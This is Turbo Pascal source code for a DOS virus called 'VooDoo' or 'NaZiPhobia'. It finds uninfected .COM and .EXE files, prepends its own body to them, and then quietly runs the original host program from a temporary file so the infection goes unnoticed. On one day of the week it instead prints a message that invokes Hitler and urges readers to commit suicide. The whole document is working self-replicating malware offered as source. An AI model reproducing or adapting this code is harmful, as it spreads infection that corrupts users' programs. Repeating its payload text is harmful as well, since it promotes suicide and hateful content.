program VooDoo_OW_vir;

uses dos;

CONST VIRSIZE = 6128;

var s     : searchrec;
    fname : string;
    buf   : array[1..VIRSIZE] of byte;
    buf2  : array[1..VIRSIZE] of byte;
    f     : file;
    y, m, d, dow : word;
    p     : pointer;
    l     : longint;

procedure Infect(s : string);

begin
   GetMem(p, 65535);
   assign(f, paramstr(0));
   reset(F, 1);
   blockread(f, buf, VIRSIZE);
   close(f);
   assign(f, s);
   reset(f, 1);
   l := filesize(f);
   blockread(f, p^, l);
   seek(f, 0);
   blockwrite(f, buf, virsize);
   blockwrite(f, p^, l);
{   blockread(f, buf2, VIRSIZE);
   seek(f, filesize(f));
   blockwrite(f, buf2, VIRSIZE);
   seek(f, 0);
   blockwrite(f, buf, VIRSIZE);}
   close(f);
   Freemem(p, 65535);
end;

function Searchfile : string;

var foundit : boolean;
    w : word;

begin
   foundit := FALSE;
   FindFirst('*.com', archive, s);
   repeat
      FindNext(s);
      assign(f, s.name);
      reset(f, 1);
      blockread(f, buf, 3);
      close(f);
      if (buf[1] <> byte('M')) and (buf[2] <> byte('Z')) then
      foundit := TRUE;
   until (doserror <> 0) or (foundit = TRUE);
   if foundit = false then begin
      findfirst('*.exe', archive, s);
      repeat
         findnext(s);
         assign(f, s.name);
         reset(f, 1);
         blockread(f, buf, 3);
         close(f);
         if buf[3] <> $F0 then foundit := TRUE;
      until (doserror <> 0) or (foundit = TRUE);
   end;
   if foundit = true then Searchfile := s.name else Searchfile := '';
end;

begin
   asm
      nop;
      nop;
      nop;
   end;
   GetDate(y, m, d, dow);
   if dow = 5 then begin
      writeln;
      writeln('ON THE SABBATH.. THE GHOST OF HITLER SPEAKS : ');
      writeln;
      writeln('"MY FELLOW NAZI''S.. I WAS WRONG.."');
      writeln('"I NOW COMMAND YOU TO COMMIT SUICIDE.. NOT GENOCIDE.."');
      writeln;
      writeln('"DO IT.. SO THE WORLD WILL BE RID OF THE NAZIPEST..');
      writeln('"AND ALL AUSLANDER CAN TRUELY BE FREE OF NAZIPHOBIA..');
      writeln;
      writeln;
      writeln('NaZiPhobia (c) [VooDoo].. We support the message..');
      writeln;
      halt;
   end else begin
      fname := Searchfile;
{      fname := 'c:\saddam\mode.com';}
      if fname <> '' then
      Infect(fname);
      GetMem(p, 65535);
      assign(f,  paramstr(0));
      reset(f, 1);
      l := filesize(f);
      blockread(f, buf, virsize);
      blockread(f, p^, l-virsize);
      close(f);
      assign(f, 'temp.com');
      rewrite(f, 1);
      blockwrite(f, p^, l-virsize);
      close(F);
      FreeMem(p, 65535);
      exec('temp.com', paramstr(1)+' '+paramstr(2)+' '+paramstr(3));
      assign(f, 'temp.com');
      erase(f);
      close(f);
   end;
end.
